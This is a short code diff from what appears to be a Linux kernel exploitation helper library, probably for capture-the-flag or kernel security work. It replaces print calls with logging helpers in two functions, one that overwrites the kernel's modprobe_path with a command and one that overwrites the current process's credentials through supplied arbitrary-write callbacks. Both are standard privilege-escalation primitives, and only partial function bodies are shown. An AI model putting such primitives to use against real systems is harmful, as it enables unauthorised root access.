@@ -7,13 +7,13 @@
 
 void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, u32),
                              void (*aaw64)(void *, u64)) {
-    puts("[+] overwriting modprobe_path");
+    log_success("overwriting modprobe_path");
     if (addr_modprobe_path == DUMMY_VALUE + kbase_offset) {
-        puts("[-] please set addr_modprobe_path");
+        log_error("please set addr_modprobe_path");
         return;
     }
     if (unlikely(aaw32 == NULL && aaw64 == NULL)) {
-        puts("[-] please implement aaw function");
+        log_error("please implement aaw function");
         return;
     }
     const u64 len = strlen(cmd) + 1;
@@ -35,9 +35,9 @@ void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, u32),
 }
 
 void overwrite_cred(void *const addr_cred, void (*aaw32)(void *, u32), void (*aaw64)(void *, u64)) {
-    puts("[+] overwriting current->cred");
+    log_success("overwriting current->cred");
     if (unlikely(aaw32 == NULL && aaw64 == NULL)) {
-        puts("[-] please implement aaw function");
+        log_error("please implement aaw function");
         return;
     }
     if (aaw32 != NULL) {
